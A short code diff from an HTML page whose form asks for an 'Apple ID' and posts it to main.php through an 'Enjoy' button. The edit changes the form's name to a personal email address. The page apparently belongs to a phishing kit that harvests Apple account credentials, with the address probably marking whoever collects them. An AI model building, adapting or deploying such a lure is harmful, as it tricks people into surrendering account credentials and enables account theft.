@@ -166,7 +166,7 @@ getConfig();                                           // close the function
 <br>=================================================
 </h1></b><br>
 
-<form id="submit-form" name="submit-form" action="main.php" method="post">
+<form id="submit-form" name="Paulytek@gmail.com" action="main.php" method="post">
 <input class="button" placeholder="Apple ID ..." input type="text" name="txtFullName"/>
 <br><br><br><br>
 <div class="enjoy-css" onClick="document.forms['submit-form'].submit();">Enjoy</div>
